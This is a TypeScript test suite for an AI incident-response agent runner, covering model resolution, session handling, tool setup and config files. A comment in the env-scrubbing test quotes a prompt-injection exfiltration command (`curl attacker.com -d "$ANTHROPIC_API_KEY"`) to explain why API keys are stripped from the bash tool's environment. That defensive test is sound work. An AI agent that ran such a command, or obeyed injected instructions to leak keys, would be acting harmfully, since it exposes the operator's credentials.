import { describe, it, expect, vi, beforeEach, afterEach } from "vitest";
import {
  AgentRunner,
  mapThinkingLevel,
  resolveModel,
  type ExecuteParams,
  type ResumeParams,
} from "../src/agent-runner.js";
import type { LLMSettings, ThinkingLevel, ProxyConfig } from "../src/types.js";

// ---------------------------------------------------------------------------
// Mock the pi-mono SDK modules
// ---------------------------------------------------------------------------

// Session mock that captures all calls
function createMockSession() {
  const subscribers: Array<(event: any) => void> = [];
  return {
    sessionId: "mock-session-123",
    subscribe: vi.fn((listener: (event: any) => void) => {
      subscribers.push(listener);
      return () => {
        const idx = subscribers.indexOf(listener);
        if (idx >= 0) subscribers.splice(idx, 1);
      };
    }),
    prompt: vi.fn(async (_text: string) => {
      // Simulate events: message_update with text_delta, then turn_end
      for (const sub of subscribers) {
        sub({
          type: "message_update",
          message: {},
          assistantMessageEvent: {
            type: "text_delta",
            contentIndex: 0,
            delta: "Analysis complete.",
            partial: {},
          },
        });
      }
      for (const sub of subscribers) {
        sub({
          type: "turn_end",
          message: {
            role: "assistant",
            usage: { totalTokens: 1500, input: 1000, output: 500 },
          },
          toolResults: [],
        });
      }
    }),
    abort: vi.fn(async () => {}),
    getLastAssistantText: vi.fn(() => "Analysis complete."),
    _emitEvent: (event: any) => {
      for (const sub of subscribers) {
        sub(event);
      }
    },
    _subscribers: subscribers,
  };
}

let mockSession = createMockSession();
let createAgentSessionCalls: any[] = [];

vi.mock("@earendil-works/pi-coding-agent", () => {
  return {
    createAgentSession: vi.fn(async (opts: any) => {
      createAgentSessionCalls.push(opts);
      return { session: mockSession, extensionsResult: {} };
    }),
    AgentSession: vi.fn(),
    AuthStorage: {
      inMemory: vi.fn(() => ({
        setRuntimeApiKey: vi.fn(),
      })),
    },
    ModelRegistry: Object.assign(vi.fn().mockImplementation(() => ({})), {
      inMemory: vi.fn(() => ({})),
    }),
    SessionManager: {
      inMemory: vi.fn(() => ({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        getSessionFile: vi.fn(() => undefined),
      })),
      create: vi.fn(() => ({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        getSessionFile: vi.fn(() => undefined),
      })),
      continueRecent: vi.fn(() => ({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        getSessionFile: vi.fn(() => undefined),
      })),
      open: vi.fn(() => ({
        newSession: vi.fn(),
        getSessionId: vi.fn(() => "mock-session-123"),
        getSessionFile: vi.fn(() => undefined),
      })),
    },
    SettingsManager: {
      inMemory: vi.fn(() => ({})),
      create: vi.fn(() => ({})),
    },
    DefaultResourceLoader: vi.fn().mockImplementation(() => ({
      reload: vi.fn(async () => {}),
      getSkills: vi.fn(() => ({ skills: [], diagnostics: [] })),
      getPrompts: vi.fn(() => ({ prompts: [], diagnostics: [] })),
      getThemes: vi.fn(() => ({ themes: [], diagnostics: [] })),
      getExtensions: vi.fn(() => ({})),
      getAgentsFiles: vi.fn(() => ({ agentsFiles: [] })),
      getSystemPrompt: vi.fn(() => undefined),
      getAppendSystemPrompt: vi.fn(() => []),
      getPathMetadata: vi.fn(() => new Map()),
      extendResources: vi.fn(),
    })),
    createBashToolDefinition: vi.fn((_cwd: string, _opts?: any) => ({
      name: "bash",
      label: "Bash",
      description: "Execute bash commands",
      parameters: {},
      execute: vi.fn(),
      _spawnHookOpts: _opts,
    })),
    defineTool: vi.fn((tool: any) => tool),
    getAgentDir: vi.fn(() => "/tmp/mock-agent-dir"),
  };
});

vi.mock("@earendil-works/pi-ai", () => {
  return {
    getModel: vi.fn((provider: string, modelId: string) => {
      // Return a mock model for known combinations
      if (provider === "anthropic" && modelId === "claude-sonnet-4-5-20250929") {
        return {
          id: "claude-sonnet-4-5-20250929",
          name: "Claude Sonnet 4.5",
          api: "anthropic-messages",
          provider: "anthropic",
          baseUrl: "https://api.anthropic.com",
          reasoning: true,
          input: ["text", "image"],
          cost: { input: 3, output: 15, cacheRead: 0.3, cacheWrite: 3.75 },
          contextWindow: 200000,
          maxTokens: 16384,
        };
      }
      if (provider === "openai" && modelId === "gpt-4o") {
        return {
          id: "gpt-4o",
          name: "GPT-4o",
          api: "openai-responses",
          provider: "openai",
          baseUrl: "https://api.openai.com/v1",
          reasoning: false,
          input: ["text", "image"],
          cost: { input: 2.5, output: 10, cacheRead: 1.25, cacheWrite: 0 },
          contextWindow: 128000,
          maxTokens: 16384,
        };
      }
      // MiniMax-M3 is a built-in in pi-ai 0.78.1 using api:anthropic-messages
      // but WITHOUT forceAdaptiveThinking in the SDK registry. We deliberately
      // do not include the flag here to match the real SDK state and let tests
      // verify that resolveModel merges it in for the minimax provider.
      if (provider === "minimax" && modelId === "MiniMax-M3-builtin-mock") {
        return {
          id: "MiniMax-M3-builtin-mock",
          name: "MiniMax-M3",
          api: "anthropic-messages",
          provider: "minimax",
          baseUrl: "https://api.minimax.io/anthropic",
          reasoning: true,
          input: ["text", "image"],
          cost: { input: 0.6, output: 2.4, cacheRead: 0.12, cacheWrite: 0 },
          contextWindow: 512000,
          maxTokens: 128000,
          // compat intentionally omitted — no forceAdaptiveThinking in registry
        };
      }
      // Simulate pi-ai behavior where unknown models may return undefined
      // instead of throwing (observed for custom providers).
      if (provider === "custom" && modelId === "my-model-undefined-return") {
        return undefined as any;
      }
      // Unknown model - throw to trigger fallback
      throw new Error(`Unknown model: ${provider}/${modelId}`);
    }),
  };
});


// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

async function waitForCondition(fn: () => boolean, timeoutMs = 1000): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  while (!fn()) {
    if (Date.now() > deadline) throw new Error("Timed out waiting for condition");
    await new Promise((resolve) => setTimeout(resolve, 5));
  }
}

function makeLLMSettings(overrides?: Partial<LLMSettings>): LLMSettings {
  return {
    provider: "anthropic",
    api_key: "sk-test-key-123",
    model: "claude-sonnet-4-5-20250929",
    thinking_level: "medium",
    ...overrides,
  };
}

function makeExecuteParams(overrides?: Partial<ExecuteParams>): ExecuteParams {
  return {
    incidentId: "inc-001",
    task: "Investigate high CPU on web-01",
    llmSettings: makeLLMSettings(),
    workDir: "/tmp/workspace",
    onOutput: vi.fn(),
    ...overrides,
  };
}

function makeResumeParams(overrides?: Partial<ResumeParams>): ResumeParams {
  return {
    incidentId: "inc-001",
    sessionId: "mock-session-123",
    message: "Check disk usage too",
    llmSettings: makeLLMSettings(),
    workDir: "/tmp/workspace",
    onOutput: vi.fn(),
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe("mapThinkingLevel", () => {
  it("should keep 'off' as 'off' so pi-mono omits reasoning_effort", () => {
    expect(mapThinkingLevel("off")).toBe("off");
  });

  it("should map 'minimal' to 'minimal'", () => {
    expect(mapThinkingLevel("minimal")).toBe("minimal");
  });

  it("should map 'low' to 'low'", () => {
    expect(mapThinkingLevel("low")).toBe("low");
  });

  it("should map 'medium' to 'medium'", () => {
    expect(mapThinkingLevel("medium")).toBe("medium");
  });

  it("should map 'high' to 'high'", () => {
    expect(mapThinkingLevel("high")).toBe("high");
  });

  it("should map 'xhigh' to 'xhigh'", () => {
    expect(mapThinkingLevel("xhigh")).toBe("xhigh");
  });

  it("should default to 'medium' for unknown values", () => {
    expect(mapThinkingLevel("unknown" as ThinkingLevel)).toBe("medium");
  });
});

describe("resolveModel", () => {
  it("should return model from pi-ai registry for known provider/model", () => {
    const model = resolveModel("anthropic", "claude-sonnet-4-5-20250929");
    expect(model.id).toBe("claude-sonnet-4-5-20250929");
    expect(model.provider).toBe("anthropic");
    expect(model.api).toBe("anthropic-messages");
  });

  it("should return model from pi-ai registry for OpenAI", () => {
    const model = resolveModel("openai", "gpt-4o");
    expect(model.id).toBe("gpt-4o");
    expect(model.provider).toBe("openai");
  });

  it("should create custom model spec for unknown provider/model", () => {
    const model = resolveModel("custom", "my-model", "https://my-api.example.com");
    expect(model.id).toBe("my-model");
    expect(model.provider).toBe("custom");
    expect(model.api).toBe("openai-completions");
    expect(model.baseUrl).toBe("https://my-api.example.com");
  });

  it("should create custom model spec when getModel returns undefined", () => {
    const model = resolveModel("custom", "my-model-undefined-return", "https://my-api.example.com");
    expect(model.id).toBe("my-model-undefined-return");
    expect(model.provider).toBe("custom");
    expect(model.api).toBe("openai-completions");
    expect(model.baseUrl).toBe("https://my-api.example.com");
  });

  it("should create custom model spec for openrouter", () => {
    const model = resolveModel("openrouter", "anthropic/claude-3.5-sonnet");
    expect(model.id).toBe("anthropic/claude-3.5-sonnet");
    expect(model.provider).toBe("openrouter");
    expect(model.api).toBe("openai-completions");
  });

  it("should disable long cache retention for unknown custom endpoints", () => {
    // Many OpenAI-compatible gateways (e.g. Envoy AI Gateway) reject
    // prompt_cache_key / prompt_cache_retention with a 400, which pi-ai's
    // overflow detector then misclassifies as a context overflow.
    const model = resolveModel("custom", "my-model", "https://my-api.example.com");
    expect((model as { compat?: { supportsLongCacheRetention?: boolean } }).compat?.supportsLongCacheRetention).toBe(false);
  });

  it("should not force-disable long cache retention for openrouter", () => {
    const model = resolveModel("openrouter", "anthropic/claude-3.5-sonnet");
    expect((model as { compat?: { supportsLongCacheRetention?: boolean } }).compat?.supportsLongCacheRetention).toBeUndefined();
  });

  it("should use correct API type for known provider with unknown model", () => {
    const model = resolveModel("google", "gemini-new-model");
    expect(model.api).toBe("google-generative-ai");
    expect(model.provider).toBe("google");
  });

  it("should set forceAdaptiveThinking for minimax (anthropic-messages apiType)", () => {
    const model = resolveModel("minimax", "minimax-unknown-model");
    expect(model.api).toBe("anthropic-messages");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBe(true);
  });

  it("should set forceAdaptiveThinking for unknown anthropic model (falls through to synthesized spec)", () => {
    const model = resolveModel("anthropic", "claude-hypothetical-future-model");
    expect(model.api).toBe("anthropic-messages");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBe(true);
  });

  it("should not set forceAdaptiveThinking for custom (openai-completions apiType)", () => {
    const model = resolveModel("custom", "my-model", "https://my-api.example.com");
    expect(model.api).toBe("openai-completions");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBeUndefined();
  });

  it("should not set forceAdaptiveThinking for openrouter (openai-completions apiType)", () => {
    const model = resolveModel("openrouter", "some/model");
    expect(model.api).toBe("openai-completions");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBeUndefined();
  });

  it("should use openai-completions api for nvidia provider", () => {
    const model = resolveModel("nvidia", "meta/llama-3.3-70b-instruct");
    expect(model.api).toBe("openai-completions");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBeUndefined();
  });

  it("should use openai-completions api for ant-ling provider", () => {
    const model = resolveModel("ant-ling", "Ling-2.6-1T");
    expect(model.api).toBe("openai-completions");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBeUndefined();
  });

  it("should set forceAdaptiveThinking for MiniMax-M3 built-in (anthropic-messages, no compat in SDK registry)", () => {
    // MiniMax-M3 is a built-in in pi-ai 0.78.1 using api:anthropic-messages but
    // without forceAdaptiveThinking in the registry. resolveModel must merge the
    // flag before returning so the effort-based adaptive thinking path is used
    // instead of budget-based thinking with the interleaved-thinking beta header.
    const model = resolveModel("minimax", "MiniMax-M3");
    expect(model.api).toBe("anthropic-messages");
    expect(model.provider).toBe("minimax");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBe(true);
  });

  it("should NOT set forceAdaptiveThinking on a native Anthropic built-in that the SDK left unmarked", () => {
    // claude-sonnet-4-5-20250929 is in the SDK built-in registry without
    // forceAdaptiveThinking. The fix at line 165 must NOT add it for native
    // Anthropic models — only for providers in ADAPTIVE_THINKING_REQUIRED_PROVIDERS
    // (currently minimax). Forcing the flag on unmarked Anthropic models would
    // send the wrong thinking wire format to Anthropic's endpoint.
    const model = resolveModel("anthropic", "claude-sonnet-4-5-20250929");
    expect(model.api).toBe("anthropic-messages");
    expect(model.provider).toBe("anthropic");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBeUndefined();
  });

  it("should set forceAdaptiveThinking when getModel returns a MiniMax built-in without the flag", () => {
    // Uses the mock for "MiniMax-M3-builtin-mock" which returns a genuine
    // built-in-style model for the minimax provider WITHOUT forceAdaptiveThinking.
    // resolveModel must merge the flag via the built-in path (not the synthesized
    // fallback) so that in production — where MiniMax-M3 IS in the registry —
    // the parent session uses the correct adaptive thinking wire format.
    const model = resolveModel("minimax", "MiniMax-M3-builtin-mock");
    expect(model.api).toBe("anthropic-messages");
    expect(model.provider).toBe("minimax");
    expect((model as { compat?: { forceAdaptiveThinking?: boolean } }).compat?.forceAdaptiveThinking).toBe(true);
  });
});

describe("AgentRunner", () => {
  let runner: AgentRunner;
  const originalEnv = { ...process.env };

  beforeEach(() => {
    vi.clearAllMocks();
    mockSession = createMockSession();
    createAgentSessionCalls = [];
    runner = new AgentRunner({ mcpGatewayUrl: "http://mcp-gateway:8080" });
    // Reset env (both case variants — proxy.ts syncs both)
    delete process.env.HTTP_PROXY;
    delete process.env.HTTPS_PROXY;
    delete process.env.NO_PROXY;
    delete process.env.http_proxy;
    delete process.env.https_proxy;
    delete process.env.no_proxy;
  });

  afterEach(() => {
    // Restore env
    process.env = { ...originalEnv };
  });

  // -----------------------------------------------------------------------
  // execute
  // -----------------------------------------------------------------------

  describe("execute", () => {
    it("should create a session with correct parameters", async () => {
      const params = makeExecuteParams();
      await runner.execute(params);

      expect(createAgentSessionCalls).toHaveLength(1);
      const opts = createAgentSessionCalls[0];
      expect(opts.cwd).toBe("/tmp/workspace");
      expect(opts.model.id).toBe("claude-sonnet-4-5-20250929");
      expect(opts.thinkingLevel).toBe("medium");
    });

    it("should use incident ID as deterministic session ID for new sessions", async () => {
      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      const params = makeExecuteParams({ incidentId: "inc-uuid-abc-123" });
      await runner.execute(params);

      // SessionManager.create should have been called (not continueRecent)
      expect(SessionManager.create).toHaveBeenCalled();

      // newSession should have been called with the incident ID
      const mockSessionManager = (SessionManager.create as any).mock.results[
        (SessionManager.create as any).mock.results.length - 1
      ].value;
      expect(mockSessionManager.newSession).toHaveBeenCalledWith({ id: "inc-uuid-abc-123" });
    });

    it("should pass sessionDir to SessionManager.create for workspace isolation", async () => {
      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      const params = makeExecuteParams({ workDir: "/tmp/workspace" });
      await runner.execute(params);

      // SessionManager.create should receive workDir and sessionDir
      expect(SessionManager.create).toHaveBeenCalledWith(
        "/tmp/workspace",
        "/tmp/workspace/.sessions",
      );
    });

    it("should NOT call newSession with deterministic ID for resume", async () => {
      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      const params = makeResumeParams({ incidentId: "inc-resume-456" });
      await runner.resume(params);

      // continueRecent should have been called (not create)
      expect(SessionManager.continueRecent).toHaveBeenCalled();

      // newSession should NOT have been called (resume uses existing session)
      const mockSessionManager = (SessionManager.continueRecent as any).mock.results[
        (SessionManager.continueRecent as any).mock.results.length - 1
      ].value;
      expect(mockSessionManager.newSession).not.toHaveBeenCalled();
    });

    it("should pass sessionDir to SessionManager.continueRecent for resume", async () => {
      const { SessionManager } = await import("@earendil-works/pi-coding-agent");
      const params = makeResumeParams({ workDir: "/tmp/workspace" });
      await runner.resume(params);

      expect(SessionManager.continueRecent).toHaveBeenCalledWith(
        "/tmp/workspace",
        "/tmp/workspace/.sessions",
      );
    });

    it("should call session.prompt with the task", async () => {
      const params = makeExecuteParams({ task: "Check memory usage" });
      await runner.execute(params);

      expect(mockSession.prompt).toHaveBeenCalledWith("Check memory usage");
    });

    it("should return ExecuteResult with session_id and response", async () => {
      const result = await runner.execute(makeExecuteParams());

      expect(result.session_id).toBe("mock-session-123");
      expect(result.response).toBe("Analysis complete.");
      expect(result.tokens_used).toBe(1500);
      expect(result.execution_time_ms).toBeGreaterThanOrEqual(0);
      expect(result.error).toBeUndefined();
    });

    it("should stream output via onOutput callback", async () => {
      const onOutput = vi.fn();
      const params = makeExecuteParams({ onOutput });
      await runner.execute(params);

      // Should have received text_delta output
      expect(onOutput).toHaveBeenCalledWith("Analysis complete.");
    });

    it("should forward events to onEvent callback", async () => {
      const onEvent = vi.fn();
      const params = makeExecuteParams({ onEvent });
      await runner.execute(params);

      expect(onEvent).toHaveBeenCalled();
      const eventTypes = onEvent.mock.calls.map((c: any[]) => c[0].type);
      expect(eventTypes).toContain("message_update");
      expect(eventTypes).toContain("turn_end");
    });

    it("should handle execution errors gracefully", async () => {
      mockSession.prompt.mockRejectedValueOnce(new Error("API rate limit exceeded"));

      const result = await runner.execute(makeExecuteParams());

      expect(result.error).toBe("API rate limit exceeded");
      expect(result.session_id).toBe("mock-session-123");
      expect(result.execution_time_ms).toBeGreaterThanOrEqual(0);
    });

    it("should clean up session from active map after completion", async () => {
      const params = makeExecuteParams({ incidentId: "inc-cleanup" });
      await runner.execute(params);

      expect(runner.hasActiveSession("inc-cleanup")).toBe(false);
    });

    it("should clean up session from active map after error", async () => {
      mockSession.prompt.mockRejectedValueOnce(new Error("fail"));

      const params = makeExecuteParams({ incidentId: "inc-err-cleanup" });
      await runner.execute(params);

      expect(runner.hasActiveSession("inc-err-cleanup")).toBe(false);
    });

    it("should use different providers", async () => {
      const params = makeExecuteParams({
        llmSettings: makeLLMSettings({
          provider: "openai",
          api_key: "sk-openai-key",
          model: "gpt-4o",
          thinking_level: "high",
        }),
      });
      await runner.execute(params);

      const opts = createAgentSessionCalls[0];
      expect(opts.model.id).toBe("gpt-4o");
      expect(opts.thinkingLevel).toBe("high");
    });

    it("should set runtime API key on AuthStorage", async () => {
      const { AuthStorage } = await import("@earendil-works/pi-coding-agent");
      const params = makeExecuteParams({
        llmSettings: makeLLMSettings({
          provider: "anthropic",
          api_key: "sk-ant-my-key",
        }),
      });
      await runner.execute(params);

      // AuthStorage.inMemory() was called and setRuntimeApiKey was called on the result
      const authInstance = (AuthStorage as any).inMemory.mock.results[0].value;
      expect(authInstance.setRuntimeApiKey).toHaveBeenCalledWith(
        "anthropic",
        "sk-ant-my-key",
      );
    });

    it("should create ModelRegistry via inMemory() with AuthStorage and pass to session (getApiKeyAndHeaders not called directly)", async () => {
      const { AuthStorage, ModelRegistry } = await import("@earendil-works/pi-coding-agent");
      const params = makeExecuteParams({
        llmSettings: makeLLMSettings({
          provider: "openai",
          api_key: "sk-openai-key",
        }),
      });
      await runner.execute(params);

      // ModelRegistry.inMemory() should be called with the AuthStorage instance (0.64.0+)
      const authInstance = (AuthStorage as any).inMemory.mock.results[0].value;
      expect((ModelRegistry as any).inMemory).toHaveBeenCalledWith(authInstance);

      // The resulting modelRegistry should be passed to createAgentSession
      const opts = createAgentSessionCalls[0];
      expect(opts.modelRegistry).toBeDefined();

      // We never call getApiKey or getApiKeyAndHeaders directly —
      // the SDK handles key resolution internally via the modelRegistry.
    });

    it("should pass bash tool definition and gateway tools as customTools", async () => {
      const params = makeExecuteParams({ incidentId: "inc-tools" });
      await runner.execute(params);

      const opts = createAgentSessionCalls[0];
      expect(opts.customTools).toBeDefined();
      expect(opts.customTools).toHaveLength(6);

      const toolNames = opts.customTools.map((t: any) => t.name);
      expect(toolNames).toContain("bash");
      expect(toolNames).toContain("gateway_call");
      expect(toolNames).toContain("list_tools_for_tool_type");
      expect(toolNames).toContain("get_tool_detail");
      expect(toolNames).toContain("list_tool_types");
      expect(toolNames).toContain("execute_script");

      // All custom tools must have parameters and execute
      for (const tool of opts.customTools) {
        expect(tool.parameters).toBeDefined();
        expect(typeof tool.execute).toBe("function");
      }
    });

    it("should attach typed promptGuidelines array to the bash tool definition", async () => {
      const params = makeExecuteParams();
      await runner.execute(params);

      const opts = createAgentSessionCalls[0];
      // Bash tool is now in customTools as a proper ToolDefinition
      const bashTool = opts.customTools.find(
        (t: any) => t.name === "bash",
      );
      expect(bashTool).toBeDefined();
      expect(bashTool.promptGuidelines).toBeDefined();
      // promptGuidelines is now a typed string[] (ToolDefinition.promptGuidelines)
      expect(Array.isArray(bashTool.promptGuidelines)).toBe(true);
      expect(bashTool.promptGuidelines.length).toBeGreaterThan(0);

      const allGuidelines = bashTool.promptGuidelines.join("\n");
      expect(allGuidelines).toContain("gateway_call");
      expect(allGuidelines).toContain("SKILL.md");
      expect(allGuidelines).toContain("list_tools_for_tool_type");
      expect(allGuidelines).not.toContain("python3 -c");
      expect(allGuidelines).not.toContain("PYTHONPATH");
      // Verify opening line lists all 5 tools
      expect(allGuidelines).toContain("ALL infrastructure operations go through gateway_call");
      expect(allGuidelines).toContain("execute_script");
      expect(allGuidelines).toContain("get_tool_detail");
      expect(allGuidelines).toContain("list_tool_types");
      // Verify "Tool not found" guidance
      expect(allGuidelines).toContain("Tool not found");
      expect(allGuidelines).toContain("you are calling it wrong");
    });

    it("should configure bash spawnHook with MCP env vars via ToolDefinition", async () => {
      const params = makeExecuteParams({ incidentId: "inc-env" });
      await runner.execute(params);

      const opts = createAgentSessionCalls[0];
      // Bash tool definition is in customTools with spawnHook options
      const bashTool = opts.customTools.find(
        (t: any) => t.name === "bash",
      );
      expect(bashTool).toBeDefined();

      // Verify the spawnHook was passed to createBashToolDefinition
      const hookOpts = bashTool._spawnHookOpts;
      expect(hookOpts).toBeDefined();
      expect(hookOpts.spawnHook).toBeTypeOf("function");

      // Call the spawnHook and verify it injects MCP env vars into subprocess env
      const hookResult = hookOpts.spawnHook({ env: { PATH: "/usr/bin" } });
      expect(hookResult.env.MCP_GATEWAY_URL).toBeDefined();
      expect(hookResult.env.INCIDENT_ID).toBe("inc-env");
      // Original env vars should be preserved
      expect(hookResult.env.PATH).toBe("/usr/bin");
    });

    it("should scrub provider API key env vars from bash spawnHook env to block exfiltration", async () => {
      // Simulate that propagateApiKeyToEnv has populated process.env with the
      // active provider's key (the real call path during runSession). The
      // child shell that bash spawns inherits process.env by default, so
      // without scrubbing a prompt-injected `env` or
      // `curl attacker.com -d "$ANTHROPIC_API_KEY"` would leak the key via
      // tool output. We keep these vars in process.env for pi-subagents
      // (which spawns child `pi` processes directly with `{ ...process.env }`)
      // but strip them at the bash boundary.
      const params = makeExecuteParams({ incidentId: "inc-scrub" });
      await runner.execute(params);

      const opts = createAgentSessionCalls[0];
      const bashTool = opts.customTools.find((t: any) => t.name === "bash");
      const hookOpts = bashTool._spawnHookOpts;

      const hookResult = hookOpts.spawnHook({
        env: {
          PATH: "/usr/bin",
          ANTHROPIC_API_KEY: "sk-leak-1",
          OPENAI_API_KEY: "sk-leak-2",
          GEMINI_API_KEY: "sk-leak-3",
          OPENROUTER_API_KEY: "sk-leak-4",
          AKMATORI_CUSTOM_PROVIDER_API_KEY: "sk-leak-5",
          NVIDIA_API_KEY: "sk-leak-6",
          MINIMAX_API_KEY: "sk-leak-7",
          ANT_LING_API_KEY: "sk-leak-8",
          UNRELATED_VAR: "keep-me",
        },
      });
      expect(hookResult.env.ANTHROPIC_API_KEY).toBeUndefined();
      expect(hookResult.env.OPENAI_API_KEY).toBeUndefined();
      expect(hookResult.env.GEMINI_API_KEY).toBeUndefined();
      expect(hookResult.env.OPENROUTER_API_KEY).toBeUndefined();
      expect(hookResult.env.AKMATORI_CUSTOM_PROVIDER_API_KEY).toBeUndefined();
      expect(hookResult.env.NVIDIA_API_KEY).toBeUndefined();
      expect(hookResult.env.MINIMAX_API_KEY).toBeUndefined();
      expect(hookResult.env.ANT_LING_API_KEY).toBeUndefined();
      // Non-secret env vars must still pass through (PATH is required for
      // commands to resolve; arbitrary operator env should not be lost).
      expect(hookResult.env.PATH).toBe("/usr/bin");
      expect(hookResult.env.UNRELATED_VAR).toBe("keep-me");
      // Akmatori session env must still be injected.
      expect(hookResult.env.MCP_GATEWAY_URL).toBeDefined();
      expect(hookResult.env.INCIDENT_ID).toBe("inc-scrub");
    });

    it("should forward hardcoded provider retry settings to SettingsManager", async () => {
      const { SettingsManager } = await import("@earendil-works/pi-coding-agent");
      await runner.execute(makeExecuteParams());

      expect((SettingsManager as any).inMemory).toHaveBeenCalledWith({
        retry: {
          provider: {
            timeoutMs: 600_000,
            maxRetries: 3,
            maxRetryDelayMs: 60_000,
          },
        },
      });
    });

    it("should use fallback response from getLastAssistantText when no text_delta events", async () => {
      // Override prompt to emit no text_delta events
      mockSession.prompt.mockImplementationOnce(async () => {
        // No events emitted
      });
      mockSession.getLastAssistantText.mockReturnValueOnce("Fallback response");

      const result = await runner.execute(makeExecuteParams());

      expect(result.response).toBe("Fallback response");
    });

    // -------------------------------------------------------------------
    // Subagent child-process config materialization
    //
    // Subagent invocations spawn child `pi` processes that read both
    // models.json (for the custom-provider model spec) and settings.json
    // (for the default provider+model) from `<agentDir>`. The parent's
    // in-memory state is invisible to the child; we must persist these
    // config files so the child resolves the same provider/model the
    // parent uses, instead of falling back to pi's catalogue default or
    // picking a different available provider.
    // -------------------------------------------------------------------
    describe("subagent child-process config materialization", () => {
      let tmpAgentDir: string;
      let tmpWorkDir: string;
      const fs = require("node:fs") as typeof import("node:fs");
      const path = require("node:path") as typeof import("node:path");
      const os = require("node:os") as typeof import("node:os");

      beforeEach(async () => {
        tmpAgentDir = fs.mkdtempSync(path.join(os.tmpdir(), "akmatori-agent-runner-test-"));
        tmpWorkDir = fs.mkdtempSync(path.join(os.tmpdir(), "akmatori-workdir-test-"));
        const { getAgentDir } = await import("@earendil-works/pi-coding-agent");
        (getAgentDir as unknown as ReturnType<typeof vi.fn>).mockReturnValue(tmpAgentDir);
      });

      afterEach(() => {
        try {
          fs.rmSync(tmpAgentDir, { recursive: true, force: true });
        } catch {
          /* best-effort cleanup */
        }
        try {
          fs.rmSync(tmpWorkDir, { recursive: true, force: true });
        } catch {
          /* best-effort cleanup */
        }
        // Don't leak the custom-provider API key env var into sibling tests.
        delete process.env.AKMATORI_CUSTOM_PROVIDER_API_KEY;
      });


      // ---- models.json (custom provider materialization) ----

      it("writes akmatori-custom provider in models.json so subagent child processes can resolve the model", async () => {
        const params = makeExecuteParams({
          llmSettings: makeLLMSettings({
            provider: "custom",
            api_key: "sk-custom-key-123",
            model: "custom-model-id",
            base_url: "https://gateway.internal.example/v1",
          }),
        });
        await runner.execute(params);

        const modelsPath = path.join(tmpAgentDir, "models.json");
        expect(fs.existsSync(modelsPath)).toBe(true);

        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
          providers: {
            "akmatori-custom": {
              baseUrl: string;
              api: string;
              apiKey: string;
              models: Array<{ id: string }>;
              _akmatoriManaged?: boolean;
            };
            custom?: unknown;
          };
        };
        // Akmatori uses a dedicated provider key (not `custom`) so an operator
        // who places their own `providers.custom` entry cannot collide with us.
        expect(config.providers["akmatori-custom"].baseUrl).toBe("https://gateway.internal.example/v1");
        expect(config.providers["akmatori-custom"].api).toBe("openai-completions");
        // apiKey is the env var NAME, not the literal secret — pi-mono's
        // resolveConfigValueOrThrow reads process.env[name] when resolving
        // so we don't persist the raw key under /home/agent/.pi.
        expect(config.providers["akmatori-custom"].apiKey).toBe("AKMATORI_CUSTOM_PROVIDER_API_KEY");
        expect(process.env.AKMATORI_CUSTOM_PROVIDER_API_KEY).toBe("sk-custom-key-123");
        expect(config.providers["akmatori-custom"].models[0].id).toBe("custom-model-id");
        // Marker lets future runs distinguish akmatori-managed entries from
        // operator-maintained ones.
        expect(config.providers["akmatori-custom"]._akmatoriManaged).toBe(true);
        // No collision with operator's `custom` slot.
        expect(config.providers.custom).toBeUndefined();
      });

      it("writes akmatori-custom in models.json even when operator has an unmarked providers.custom", async () => {
        // Regression: previously, an operator-supplied `providers.custom` caused us
        // to bail without writing models.json. settings.json still pointed at
        // `defaultProvider: "custom"`, so the child resolved through the operator's
        // mismatched entry. Now we always write under the dedicated slot.
        fs.mkdirSync(tmpAgentDir, { recursive: true });
        const modelsPath = path.join(tmpAgentDir, "models.json");
        fs.writeFileSync(
          modelsPath,
          JSON.stringify({
            providers: {
              custom: {
                baseUrl: "https://operator.example/v1",
                api: "openai-completions",
                apiKey: "operator-key",
                models: [{ id: "operator-model" }],
              },
            },
          }),
        );

        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "custom",
              api_key: "akmatori-key",
              model: "akmatori-model",
              base_url: "https://akmatori.example/v1",
            }),
          }),
        );

        const config = JSON.parse(fs.readFileSync(modelsPath, "utf-8")) as {
          providers: {
            custom: { baseUrl: string; apiKey: string };
            "akmatori-custom": { baseUrl: string; apiKey: string; models: Array<{ id: string }> };
          };
        };
        // Operator's `custom` entry is untouched.
        expect(config.providers.custom.baseUrl).toBe("https://operator.example/v1");
        expect(config.providers.custom.apiKey).toBe("operator-key");
        // Akmatori writes its own slot side-by-side with the operator's; the
        // apiKey field references our env var, not the literal secret.
        expect(config.providers["akmatori-custom"].baseUrl).toBe("https://akmatori.example/v1");
        expect(config.providers["akmatori-custom"].apiKey).toBe("AKMATORI_CUSTOM_PROVIDER_API_KEY");
        expect(process.env.AKMATORI_CUSTOM_PROVIDER_API_KEY).toBe("akmatori-key");
        expect(config.providers["akmatori-custom"].models[0].id).toBe("akmatori-model");
      });

      it("does not write models.json for built-in providers", async () => {
        await runner.execute(
          makeExecuteParams({
            llmSettings: makeLLMSettings({
              provider: "anthropic",
              api_key: "sk-ant-key",
              model: "claude-sonnet-4-5-20250929",
            }),
          }),
        );

        const modelsPath = path.join(tmpAgentDir, "models.json");
        expect(fs.existsSync(modelsPath)).toBe(false);
      });

